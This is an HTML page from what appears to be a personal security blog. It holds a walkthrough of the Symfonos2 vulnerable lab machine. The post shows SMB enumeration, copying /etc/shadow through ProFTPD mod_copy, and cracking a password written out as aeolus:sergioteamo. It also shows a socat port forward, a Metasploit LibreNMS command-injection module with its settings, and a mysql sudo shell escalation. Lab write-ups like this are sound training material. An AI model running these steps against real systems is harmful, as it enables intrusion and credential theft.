@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    symfonos2 |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-sol0pm" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      symfonos2
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/07/13/sol0pm/" class="article-date">
+  <time datetime="2020-07-12T23:45:36.000Z" itemprop="datePublished">2020-07-13</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>nmap 扫描一下端口</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594597577568-5a7b5a53-ea45-47e3-9c20-b7bc578957aa.png#align=left&display=inline&height=350&margin=%5Bobject%20Object%5D&name=image.png&originHeight=699&originWidth=830&size=173344&status=done&style=none&width=415" alt="image.png"></p>
+<p>访问 80 端口有个图片（1920*1080 的还可以用来做壁纸）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594598636371-5518d42d-ee18-4a96-9a72-0624be50c73c.png#align=left&display=inline&height=461&margin=%5Bobject%20Object%5D&name=image.png&originHeight=922&originWidth=1651&size=4287628&status=done&style=none&width=825.5" alt="image.png"></p>
+<p>nmap 扫出来的里面有个 ftp，访问需要验证身份<br>还有个 smb，通过 smbclient 连接一下：smbclient //192.168.149.180/anonymous<br>密码那里直接回车就行</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594600932712-685ed472-1cc8-4757-8120-ba28456057bd.png#align=left&display=inline&height=229&margin=%5Bobject%20Object%5D&name=image.png&originHeight=408&originWidth=1088&size=88426&status=done&style=none&width=611" alt="image.png"></p>
+<p>把里面的 log.txt 下到本地，然后查看一下，没发现 password 相关的，找到一个 user：aeolus</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594601854697-7b2cf767-8c39-4c41-9417-cdfacde205f6.png#align=left&display=inline&height=445&margin=%5Bobject%20Object%5D&name=image.png&originHeight=889&originWidth=1321&size=245897&status=done&style=none&width=660.5" alt="image.png"></p>
+<p>另外可以看一下 log.txt 第一行的内容<br>root@symfonos2:~# cat /etc/shadow &gt; /var/backups/shadow.bak<br>用这个脚本，拷贝一下<br><a href="https://github.com/chcx/cpx_proftpd/" target="_blank" rel="noopener">https://github.com/chcx/cpx_proftpd/</a></p>
+<p>然后 get 下来</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594603966268-ebe8d842-0d9b-46ed-ba26-ba0c930445a4.png#align=left&display=inline&height=221&margin=%5Bobject%20Object%5D&name=image.png&originHeight=344&originWidth=1070&size=84548&status=done&style=none&width=686" alt="image.png"></p>
+<p>看看 shadow，从这里面获得了用户的密码 hash</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594603943442-18e7cd90-5d37-4438-85c1-856ced1670a2.png#align=left&display=inline&height=381&margin=%5Bobject%20Object%5D&name=image.png&originHeight=508&originWidth=883&size=129593&status=done&style=stroke&width=662" alt="image.png"></p>
+<p>爆破一下，很快就能被跑出一个 aeolus:sergioteamo</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594604850488-0cfcdaf2-779e-45d3-a62e-2fd36b74f0ed.png#align=left&display=inline&height=223&margin=%5Bobject%20Object%5D&name=image.png&originHeight=349&originWidth=1014&size=111157&status=done&style=none&width=647" alt="image.png"></p>
+<p>用这个登录 ssh 成功</p>
+<p>nmap 扫一下自己，发现有个 8080 口是开这个，但是只能本地访问</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594606495585-c2b970d0-a3b3-4a00-b414-e647225b2e80.png#align=left&display=inline&height=360&margin=%5Bobject%20Object%5D&name=image.png&originHeight=720&originWidth=1243&size=182755&status=done&style=none&width=621.5" alt="image.png"></p>
+<p>socat -d TCP-LISTEN:6666,fork,reuseaddr tcp:127.0.0.1:8080</p>
+<p>然后本地访问就行了，火狐可能会禁止访问</p>
+<blockquote>
+<p>此网址使用了一个通常用于网络浏览以外目的的端口。出于安全原因，Firefox 取消了该请求。</p>
+</blockquote>
+<p>在火狐访问 about:config 然后新建一个</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594607972637-8b90cdf5-384c-4f06-9238-2d3a3d1051f5.png#align=left&display=inline&height=258&margin=%5Bobject%20Object%5D&name=image.png&originHeight=515&originWidth=748&size=79789&status=done&style=none&width=374" alt="image.png"><br>首选项名称：<br>network.security.ports.banned.override<br>值：<br>0-65535</p>
+<p>就可以访问了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594608267504-949557fc-f7a5-4911-85b3-e0a917f9bfce.png#align=left&display=inline&height=288&margin=%5Bobject%20Object%5D&name=image.png&originHeight=575&originWidth=1009&size=46749&status=done&style=none&width=504.5" alt="image.png"></p>
+<p>用 msf 的 linux/http/librenms_addhost_cmd_inject 进行攻击<br>set rhosts 192.168.149.180<br>set rport 6666<br>set username aeolus<br>set password sergioteamo<br>set lhost 192.168.149.180</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594608248522-3ebbcf31-53da-4111-b2d3-b26f5f95a9e1.png#align=left&display=inline&height=309&margin=%5Bobject%20Object%5D&name=image.png&originHeight=465&originWidth=1122&size=103658&status=done&style=none&width=746" alt="image.png"></p>
+<p>这时候 sudo -l 可以发现 mysql 是可以不需要密码就能 sudo 运行的<br>可以在这里面找 <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io</a><br><code>mysql -e &#39;\! /bin/sh&#39;</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594608396302-d2f97e87-858b-4903-b6ff-bd77054c2539.png#align=left&display=inline&height=179&margin=%5Bobject%20Object%5D&name=image.png&originHeight=293&originWidth=821&size=49202&status=done&style=none&width=501" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1594608446201-a77aff48-be5d-4943-bf43-55a88977b7b7.png#align=left&display=inline&height=309&margin=%5Bobject%20Object%5D&name=image.png&originHeight=618&originWidth=751&size=56555&status=done&style=none&width=375.5" alt="image.png"></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/07/13/sol0pm/" data-id="ckco53qbj000h8ou9eejpa8i1" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/07/12/gcqapk/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">upload-labs</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
